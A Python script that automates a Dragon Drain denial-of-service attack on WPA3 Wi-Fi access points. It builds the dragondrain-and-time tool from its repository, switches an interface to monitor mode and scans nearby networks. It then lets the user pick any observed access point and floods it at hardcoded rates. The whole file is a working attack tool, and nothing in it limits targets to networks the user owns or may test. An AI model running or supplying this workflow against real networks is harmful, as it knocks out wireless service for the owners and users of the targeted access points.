#!/usr/bin/env python3

import csv
import glob
import logging
import os
import re
import shlex
import shutil
import signal
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
COLOR_ERROR = "\033[31m" if COLOR_ENABLED else ""
COLOR_DIM = "\033[90m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(MODULE_DIR)
TOOLS_DIR = os.path.join(PROJECT_ROOT, "tools")
DRAGON_DIR = os.path.join(TOOLS_DIR, "dragondrain-and-time")
DRAGON_SRC_DIR = os.path.join(DRAGON_DIR, "src")
DRAGON_BIN_PATH = os.path.join(DRAGON_SRC_DIR, "dragondrain")
RADIOTAP_HEADER_PATH = os.path.join(
    DRAGON_DIR,
    "src",
    "aircrack-osdep",
    "radiotap",
    "radiotap.h",
)

DRAGON_REPO_URL = "https://github.com/vanhoefm/dragondrain-and-time.git"
MONITOR_SETTLE_SECONDS = 2.0
SCAN_PROGRESS_INTERVAL = 0.2
DEFAULT_SCAN_DURATION = 15
ATTACK_REQUIRED_TOOLS = ["iw", "ip", "airodump-ng", "ethtool"]
INSTALL_REQUIRED_TOOLS = ["apt-get"]
SYSTEM_APT_PACKAGES = [
    "aircrack-ng",
    "ethtool",
    "iproute2",
    "git",
    "autoconf",
    "automake",
    "libtool",
    "shtool",
    "libssl-dev",
    "pkg-config",
    "build-essential",
]

# Requested by user to keep hardcoded for now.
DRAGON_BEACON_RATE = "54"  # -b
DRAGON_RANDOM_MACS = "20"  # -n
DRAGON_PACKETS_PER_SECOND = "200"  # -r

MAC_RE = re.compile(r"^(?:[0-9a-f]{2}:){5}[0-9a-f]{2}$", re.IGNORECASE)


@dataclass
class AccessPoint:
    ssid: str
    bssid: str
    channel: Optional[int]
    power: Optional[int]
    privacy: str
    clients: int = 0


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def print_header(title: str, subtitle: Optional[str] = None) -> None:
    logging.info(style(title, COLOR_HEADER, STYLE_BOLD))
    if subtitle:
        logging.info(subtitle)
    logging.info("")


def prompt_yes_no(message: str, default_yes: bool = True) -> bool:
    raw = input(style(message, STYLE_BOLD)).strip().lower()
    if not raw:
        return default_yes
    return raw in {"y", "yes"}


def missing_tools(tools: List[str]) -> List[str]:
    return [tool for tool in tools if shutil.which(tool) is None]


def list_network_interfaces() -> List[str]:
    interfaces: List[str] = []
    ip_link = subprocess.run(["ip", "-o", "link", "show"], stdout=subprocess.PIPE, text=True, check=False)
    for line in ip_link.stdout.splitlines():
        if ": " in line:
            name = line.split(": ", 1)[1].split(":", 1)[0]
            if name and name != "lo":
                interfaces.append(name)
    return interfaces


def get_interface_chipset(interface: str) -> str:
    try:
        result = subprocess.run(
            ["ethtool", "-i", interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            check=False,
        )
    except FileNotFoundError:
        return "unknown"

    if result.returncode != 0:
        return "unknown"

    driver = None
    bus_info = None
    for line in result.stdout.splitlines():
        if line.startswith("driver:"):
            driver = line.split(":", 1)[1].strip()
        if line.startswith("bus-info:"):
            bus_info = line.split(":", 1)[1].strip()

    if driver and bus_info and bus_info != "":
        return f"{driver} ({bus_info})"
    if driver:
        return driver
    return "unknown"


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        display_name = f"{name} (AP running)" if name == "wlan0" else name
        label = f"{index}) {display_name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select attack interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def get_interface_mode(interface: str) -> Optional[str]:
    result = subprocess.run(
        ["iw", "dev", interface, "info"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None

    for raw_line in result.stdout.splitlines():
        line = raw_line.strip()
        if line.startswith("type "):
            parts = line.split()
            if len(parts) >= 2:
                return parts[1]
    return None


def is_interface_up(interface: str) -> bool:
    result = subprocess.run(
        ["ip", "link", "show", interface],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return False
    return "state UP" in result.stdout


def wait_for_interface_ready(interface: str, target_mode: str, timeout_seconds: float = 6.0) -> bool:
    end_time = time.time() + max(0.5, timeout_seconds)
    while time.time() < end_time:
        if get_interface_mode(interface) == target_mode and is_interface_up(interface):
            return True
        time.sleep(0.2)
    return False


def set_interface_type(interface: str, mode: str) -> bool:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        result = subprocess.run(
            ["iw", "dev", interface, "set", "type", mode],
            stderr=subprocess.PIPE,
            text=True,
            check=False,
        )
        if result.returncode != 0:
            logging.error("Failed to set %s mode: %s", mode, result.stderr.strip() or "unknown error")
            return False
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
        return True
    except Exception as exc:
        logging.error("Failed to set %s mode: %s", mode, exc)
        return False


def set_interface_mode(interface: str, mode: str) -> bool:
    if not set_interface_type(interface, mode):
        return False
    if not wait_for_interface_ready(interface, mode):
        logging.error("Interface %s did not become %s mode in time.", interface, mode)
        return False
    if mode == "monitor":
        time.sleep(MONITOR_SETTLE_SECONDS)
    else:
        time.sleep(0.8)
    return True


def restore_managed_mode(interface: str) -> None:
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=False, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", interface, "up"], check=False, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def is_valid_mac(mac_address: str) -> bool:
    return bool(MAC_RE.fullmatch((mac_address or "").strip()))


def parse_channel(value: str) -> Optional[int]:
    try:
        channel = int((value or "").strip())
    except ValueError:
        return None
    if 1 <= channel <= 196:
        return channel
    return None


def parse_power(value: str) -> Optional[int]:
    try:
        return int((value or "").strip())
    except ValueError:
        return None


def parse_airodump_csv(csv_path: str) -> List[AccessPoint]:
    networks: Dict[str, AccessPoint] = {}
    clients_per_bssid: Dict[str, int] = {}
    station_section = False

    with open(csv_path, "r", encoding="utf-8", errors="ignore", newline="") as handle:
        reader = csv.reader(handle)
        for row in reader:
            if not row:
                continue

            first_col = (row[0] or "").strip()
            if not first_col:
                continue

            if first_col == "BSSID":
                station_section = False
                continue

            if first_col == "Station MAC":
                station_section = True
                continue

            if station_section:
                if len(row) < 6:
                    continue
                bssid = (row[5] or "").strip().lower()
                if is_valid_mac(bssid):
                    clients_per_bssid[bssid] = clients_per_bssid.get(bssid, 0) + 1
                continue

            if len(row) < 14:
                continue

            bssid = (row[0] or "").strip().lower()
            if not is_valid_mac(bssid):
                continue

            channel = parse_channel(row[3] if len(row) > 3 else "")
            privacy = (row[5] if len(row) > 5 else "").strip() or "?"
            power = parse_power(row[8] if len(row) > 8 else "")
            ssid = (row[13] if len(row) > 13 else "").strip() or "<hidden>"

            existing = networks.get(bssid)
            candidate = AccessPoint(
                ssid=ssid,
                bssid=bssid,
                channel=channel,
                power=power,
                privacy=privacy,
            )

            if existing is None:
                networks[bssid] = candidate
                continue

            existing_power = existing.power if existing.power is not None else -999
            candidate_power = candidate.power if candidate.power is not None else -999
            if candidate_power > existing_power:
                networks[bssid] = candidate
            elif existing.channel is None and candidate.channel is not None:
                existing.channel = candidate.channel
            elif existing.ssid == "<hidden>" and candidate.ssid != "<hidden>":
                existing.ssid = candidate.ssid

    for bssid, count in clients_per_bssid.items():
        if bssid in networks:
            networks[bssid].clients = count

    return sorted(
        networks.values(),
        key=lambda item: (
            item.clients,
            item.power if item.power is not None else -999,
        ),
        reverse=True,
    )


def stop_process(process: Optional[subprocess.Popen]) -> None:
    if process is None:
        return
    if process.poll() is not None:
        return
    try:
        try:
            pgid = os.getpgid(process.pid)
        except Exception:
            pgid = None

        if pgid is not None:
            try:
                os.killpg(pgid, signal.SIGTERM)
            except Exception:
                process.terminate()
        else:
            process.terminate()

        process.wait(timeout=3)
    except subprocess.TimeoutExpired:
        try:
            if pgid is not None:
                os.killpg(pgid, signal.SIGKILL)
            else:
                process.kill()
        except Exception:
            try:
                process.kill()
            except Exception:
                pass
    except Exception:
        pass


def scan_networks(interface: str, duration_seconds: int) -> List[AccessPoint]:
    duration = max(1, duration_seconds)
    with tempfile.TemporaryDirectory(prefix="dragon_scan_") as temp_dir:
        prefix = os.path.join(temp_dir, "scan")
        command = [
            "airodump-ng",
            interface,
            "--band",
            "ab",
            "--output-format",
            "csv",
            "--write",
            prefix,
        ]

        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                preexec_fn=os.setsid,
            )
        except FileNotFoundError:
            logging.error("Required tool 'airodump-ng' not found.")
            return []
        except Exception as exc:
            logging.error("Failed to start scan: %s", exc)
            return []

        end_time = time.time() + duration
        last_remaining = None
        while time.time() < end_time:
            remaining = max(0, int(end_time - time.time()))
            if COLOR_ENABLED and remaining != last_remaining:
                last_remaining = remaining
                message = (
                    f"{style('Scanning', STYLE_BOLD)}... "
                    f"{style(str(remaining), COLOR_SUCCESS, STYLE_BOLD)}s remaining"
                )
                sys.stdout.write("\r" + message)
                sys.stdout.flush()
            time.sleep(SCAN_PROGRESS_INTERVAL)

        if COLOR_ENABLED:
            sys.stdout.write("\n")

        stop_process(process)
        time.sleep(0.3)

        csv_candidates = sorted(glob.glob(f"{prefix}-*.csv"), key=os.path.getmtime)
        if not csv_candidates:
            logging.warning("No scan output captured.")
            return []

        latest_csv = csv_candidates[-1]
        try:
            return parse_airodump_csv(latest_csv)
        except Exception as exc:
            logging.error("Failed to parse scan output: %s", exc)
            return []


def select_target_ap(interface: str, duration_seconds: int) -> Optional[AccessPoint]:
    while True:
        networks = scan_networks(interface, duration_seconds)
        if not networks:
            retry = input(
                f"{style('Rescan', STYLE_BOLD)} (Y) or {style('Exit', STYLE_BOLD)} (E): "
            ).strip().lower()
            if retry == "y":
                continue
            return None

        logging.info("")
        logging.info(style("Observed networks:", STYLE_BOLD))
        for index, ap in enumerate(networks, start=1):
            ch = str(ap.channel) if ap.channel is not None else "?"
            power = f"{ap.power} dBm" if ap.power is not None else "signal ?"
            clients = f"clients {ap.clients}"
            sec = ap.privacy if ap.privacy else "?"
            label = f"{index}) {ap.ssid} ({ap.bssid}) -"
            logging.info(
                "  %s ch %s | %s | %s | %s",
                color_text(label, COLOR_HIGHLIGHT),
                ch,
                sec,
                clients,
                power,
            )

        choice = input(
            f"{style('Select target AP', STYLE_BOLD)} (number, R to rescan, E to exit): "
        ).strip().lower()

        if choice == "r":
            continue
        if choice in {"e", "q", "exit", "quit"}:
            return None
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(networks):
                return networks[idx - 1]
        logging.warning("Invalid selection. Try again.")


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def run_shell_command(command: List[str], cwd: Optional[str] = None) -> bool:
    command_label = " ".join(shlex.quote(part) for part in command)
    logging.info("%s %s", color_text("$", COLOR_DIM), command_label)
    result = subprocess.run(command, cwd=cwd, check=False)
    if result.returncode != 0:
        logging.error("Command failed (exit %s): %s", result.returncode, command_label)
        return False
    return True


def patch_radiotap_header() -> bool:
    if not os.path.isfile(RADIOTAP_HEADER_PATH):
        logging.error("File not found: %s", RADIOTAP_HEADER_PATH)
        return False

    with open(RADIOTAP_HEADER_PATH, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    updated = content
    updated = re.sub(r"}\s*__packed\s*;", "} ;", updated)
    updated = re.sub(r"}\s*__attribute__\s*\(\(\s*__packed__\s*\)\)\s*;", "} ;", updated)
    if updated == content:
        if "} ;" in content:
            logging.info("radiotap.h already patched.")
            return True
        logging.error("Could not find packed struct marker in radiotap.h.")
        return False

    with open(RADIOTAP_HEADER_PATH, "w", encoding="utf-8") as handle:
        handle.write(updated)

    logging.info("Patched radiotap.h (removed packed marker).")
    return True


def ensure_dragon_repo() -> bool:
    os.makedirs(TOOLS_DIR, exist_ok=True)

    git_dir = os.path.join(DRAGON_DIR, ".git")
    if os.path.isdir(git_dir):
        logging.info("Dragon repo already present: %s", DRAGON_DIR)
        return True

    if os.path.exists(DRAGON_DIR) and not os.path.isdir(git_dir):
        logging.error("Directory exists but is not a git repo: %s", DRAGON_DIR)
        return False

    return run_shell_command(["git", "clone", DRAGON_REPO_URL, DRAGON_DIR], cwd=TOOLS_DIR)


def install_dragon() -> bool:
    print_header("Install Dragon", "Builds dragondrain-and-time in local tools directory")

    if os.geteuid() != 0:
        logging.error("Install Dragon requires root privileges.")
        return False

    missing_install_tools = missing_tools(INSTALL_REQUIRED_TOOLS)
    if missing_install_tools:
        logging.error("Missing installer tools: %s", ", ".join(missing_install_tools))
        return False

    if not run_shell_command(["apt-get", "install", "-y", *SYSTEM_APT_PACKAGES], cwd=PROJECT_ROOT):
        return False

    if not ensure_dragon_repo():
        return False

    if not run_shell_command(["autoreconf", "-i"], cwd=DRAGON_DIR):
        return False
    if not run_shell_command(["./autogen.sh"], cwd=DRAGON_DIR):
        return False
    if not run_shell_command(["./configure"], cwd=DRAGON_DIR):
        return False
    if not patch_radiotap_header():
        return False
    if not run_shell_command(["make"], cwd=DRAGON_DIR):
        return False

    if os.path.isfile(DRAGON_BIN_PATH):
        logging.info(color_text("Dragon install completed successfully.", COLOR_SUCCESS))
        logging.info("Binary: %s", DRAGON_BIN_PATH)
        return True

    logging.error("Build finished but binary not found: %s", DRAGON_BIN_PATH)
    return False


def dragon_ready() -> bool:
    return os.path.isfile(DRAGON_BIN_PATH) and os.access(DRAGON_BIN_PATH, os.X_OK)


def ensure_required_tools() -> bool:
    missing = missing_tools(ATTACK_REQUIRED_TOOLS)
    if not missing:
        return True
    logging.error("Missing required tools: %s", ", ".join(missing))
    return False


def set_interface_channel(interface: str, channel: int) -> bool:
    result = subprocess.run(
        ["iw", "dev", interface, "set", "channel", str(channel)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        logging.error("Failed to set channel %s: %s", channel, result.stderr.strip() or "unknown error")
        return False
    return True


def run_attack(interface: str, target: AccessPoint) -> bool:
    if target.channel is None:
        logging.error("Target channel is unknown; cannot run Dragon Drain.")
        return False

    if not set_interface_channel(interface, target.channel):
        return False

    command = [
        DRAGON_BIN_PATH,
        "-d",
        interface,
        "-a",
        target.bssid,
        "-c",
        str(target.channel),
        "-b",
        DRAGON_BEACON_RATE,
        "-n",
        DRAGON_RANDOM_MACS,
        "-r",
        DRAGON_PACKETS_PER_SECOND,
    ]

    logging.info("")
    logging.info(style("Running command:", STYLE_BOLD))
    logging.info("%s", " ".join(shlex.quote(part) for part in command))
    logging.info("")

    try:
        process = subprocess.Popen(command, cwd=DRAGON_SRC_DIR, preexec_fn=os.setsid)
    except FileNotFoundError:
        logging.error("Dragon binary not found: %s", DRAGON_BIN_PATH)
        return False
    except Exception as exc:
        logging.error("Failed to start Dragon Drain: %s", exc)
        return False

    time.sleep(1.0)
    if process.poll() is not None:
        logging.error("Dragon Drain exited immediately (code %s).", process.returncode)
        return False

    logging.info(style("Attack is running.", COLOR_SUCCESS, STYLE_BOLD))
    logging.info("Press %s to stop attack and return.", style("Enter", COLOR_SUCCESS, STYLE_BOLD))

    try:
        input()
    except KeyboardInterrupt:
        logging.info("")
        logging.info("Interrupted by user.")
    finally:
        stop_process(process)

    logging.info(color_text("Dragon Drain stopped.", COLOR_SUCCESS))
    return True


def run_attack_session() -> None:
    if not ensure_required_tools():
        return

    if not dragon_ready():
        logging.error("Dragon Drain is not built yet.")
        logging.info(
            "Use %s from this module first.",
            style("Install Dragon", COLOR_SUCCESS, STYLE_BOLD),
        )
        return

    interfaces = list_network_interfaces()
    attack_interface = select_interface(interfaces)
    original_mode = get_interface_mode(attack_interface)
    changed_to_monitor = False

    try:
        logging.info("")
        input(
            f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to switch "
            f"{attack_interface} to monitor mode..."
        )
        if original_mode != "monitor":
            if not set_interface_mode(attack_interface, "monitor"):
                return
            changed_to_monitor = True
            logging.info("Monitor mode confirmed on %s.", attack_interface)
        else:
            logging.info("%s is already in monitor mode.", attack_interface)

        logging.info("")
        scan_seconds = prompt_int(
            f"{style('Scan duration', STYLE_BOLD)} in seconds "
            f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} for {style(str(DEFAULT_SCAN_DURATION), COLOR_SUCCESS, STYLE_BOLD)}): ",
            default=DEFAULT_SCAN_DURATION,
            minimum=1,
        )

        logging.info("")
        input(
            f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to scan networks on "
            f"{attack_interface}..."
        )
        target = select_target_ap(attack_interface, scan_seconds)
        if target is None:
            logging.info("Aborted by user.")
            return

        logging.info("")
        logging.info("Selected: %s (%s)", style(target.ssid, COLOR_SUCCESS, STYLE_BOLD), target.bssid)
        logging.info("Channel: %s", target.channel if target.channel is not None else "?")
        logging.info("Security: %s", target.privacy)

        logging.info("")
        input(
            f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start Dragon Drain attack..."
        )
        run_attack(attack_interface, target)
    finally:
        if changed_to_monitor:
            restore_managed_mode(attack_interface)


def bootstrap_dragon() -> bool:
    missing_runtime = missing_tools(ATTACK_REQUIRED_TOOLS)
    binary_ready = dragon_ready()
    installer_ready = not missing_tools(INSTALL_REQUIRED_TOOLS)

    if not missing_runtime and binary_ready:
        logging.info(color_text("Dragon Drain environment is ready.", COLOR_SUCCESS))
        return True

    logging.info(style("Bootstrap check:", STYLE_BOLD))
    if missing_runtime:
        logging.info("Missing runtime tools: %s", ", ".join(missing_runtime))
    if not binary_ready:
        logging.info("Dragon binary not found: %s", DRAGON_BIN_PATH)
    if not installer_ready:
        logging.info("Installer tool missing: apt-get")

    logging.info("")
    if not prompt_yes_no("Install all required tools and build Dragon now? [Y/n]: ", default_yes=True):
        logging.info("Installation skipped by user.")
        return False

    logging.info("")
    if not install_dragon():
        return False

    if not ensure_required_tools():
        return False
    if not dragon_ready():
        logging.error("Dragon Drain binary is still missing after install.")
        return False

    logging.info(color_text("Bootstrap completed.", COLOR_SUCCESS))
    return True


def main() -> None:
    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)
    print_header("Dragon Drain", "Single-target Dragon Drain attack workflow")
    if not bootstrap_dragon():
        return
    logging.info("")
    run_attack_session()


if __name__ == "__main__":
    main()
